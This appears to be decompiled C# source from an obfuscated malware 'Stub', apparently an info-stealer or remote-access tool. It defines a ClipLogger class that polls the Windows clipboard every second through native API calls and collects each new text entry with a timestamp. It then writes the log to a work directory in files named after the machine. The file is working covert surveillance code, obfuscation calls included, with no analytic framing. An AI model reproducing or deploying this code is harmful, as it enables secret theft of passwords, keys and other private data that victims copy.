using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000015 RID: 21
	internal sealed class ClipLogger
	{
		// Token: 0x0600005A RID: 90
		[DllImport("user32.dll")]
		private static extern bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x0600005B RID: 91
		[DllImport("user32.dll")]
		private static extern bool CloseClipboard();

		// Token: 0x0600005C RID: 92
		[DllImport("user32.dll")]
		private static extern IntPtr GetClipboardData(uint uFormat);

		// Token: 0x0600005D RID: 93
		[DllImport("user32.dll")]
		private static extern bool IsClipboardFormatAvailable(uint format);

		// Token: 0x0600005E RID: 94
		[DllImport("kernel32.dll")]
		private static extern IntPtr GlobalLock(IntPtr hMem);

		// Token: 0x0600005F RID: 95
		[DllImport("kernel32.dll")]
		private static extern bool GlobalUnlock(IntPtr hMem);

		// Token: 0x06000060 RID: 96 RVA: 0x00008B18 File Offset: 0x00006D18
		public static void Start()
		{
			if (!ClipLogger._isRunning)
			{
				ClipLogger._isRunning = true;
				ClipLogger._clipboardThread = new Thread(new ThreadStart(ClipLogger.ClipboardMonitor));
				ClipLogger._clipboardThread.IsBackground = true;
				ClipLogger._clipboardThread.SetApartmentState(ApartmentState.STA);
				ClipLogger._clipboardThread.Start();
				Console.WriteLine("Clipboard logger started...");
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00008B74 File Offset: 0x00006D74
		public static void Stop()
		{
			ClipLogger._isRunning = false;
			if (ClipLogger._wordCount > 0)
			{
				ClipLogger.SaveToFile();
			}
			Console.WriteLine("Clipboard logger stopped.");
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00008BA0 File Offset: 0x00006DA0
		private static void ClipboardMonitor()
		{
			while (ClipLogger._isRunning)
			{
				try
				{
					ClipLogger.CheckClipboard();
					Thread.Sleep(1000);
				}
				catch (Exception ex)
				{
					Console.WriteLine("Clipboard monitor error: " + ex.Message);
					Thread.Sleep(5000);
				}
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00008BFC File Offset: 0x00006DFC
		private static void CheckClipboard()
		{
			if (ClipLogger.IsClipboardFormatAvailable(1U) && ClipLogger.OpenClipboard(IntPtr.Zero))
			{
				string text = string.Empty;
				IntPtr clipboardData = ClipLogger.GetClipboardData(1U);
				if (clipboardData != IntPtr.Zero)
				{
					IntPtr intPtr = ClipLogger.GlobalLock(clipboardData);
					if (intPtr != IntPtr.Zero)
					{
						text = Marshal.PtrToStringAnsi(intPtr);
						ClipLogger.GlobalUnlock(clipboardData);
					}
				}
				ClipLogger.CloseClipboard();
				if (!string.IsNullOrEmpty(text) && !(text == ClipLogger._lastClipboardText))
				{
					ClipLogger._lastClipboardText = text;
					ClipLogger._currentContent.AppendLine(string.Format("--- Clipboard Entry [{0:yyyy-MM-dd HH:mm:ss}] ---", DateTime.Now));
					ClipLogger._currentContent.AppendLine(text);
					ClipLogger._currentContent.AppendLine();
					int num = text.Split(new char[] { ' ', '\t', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries).Length;
					ClipLogger._wordCount += num;
					Console.WriteLine(string.Format("Captured clipboard content. Total words: {0}", ClipLogger._wordCount));
					if (ClipLogger._wordCount >= 100)
					{
						ClipLogger.SaveToFile();
					}
				}
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00008D18 File Offset: 0x00006F18
		private static void SaveToFile()
		{
			try
			{
				string text = string.Format("{0}_{1:yyyyMMdd_HHmmss}.txt", Environment.MachineName, DateTime.Now);
				string text2 = Paths.InitWorkDir();
				string text3 = Path.Combine(text2, text);
				Directory.CreateDirectory(text2);
				File.WriteAllText(text3, ClipLogger._currentContent.ToString());
				Console.WriteLine("Saved clipboard log to: " + text3);
				ClipLogger._currentContent.Clear();
				ClipLogger._wordCount = 0;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error saving clipboard log: " + ex.Message);
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000038B4 File Offset: 0x00001AB4
		public ClipLogger()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0000396E File Offset: 0x00001B6E
		static ClipLogger()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			ClipLogger._isRunning = false;
			ClipLogger._currentContent = new StringBuilder();
			ClipLogger._wordCount = 0;
			ClipLogger._lastClipboardText = string.Empty;
		}

		// Token: 0x04000049 RID: 73
		private static Thread _clipboardThread;

		// Token: 0x0400004A RID: 74
		private static bool _isRunning;

		// Token: 0x0400004B RID: 75
		private static StringBuilder _currentContent;

		// Token: 0x0400004C RID: 76
		private static int _wordCount;

		// Token: 0x0400004D RID: 77
		private static string _lastClipboardText;
	}
}
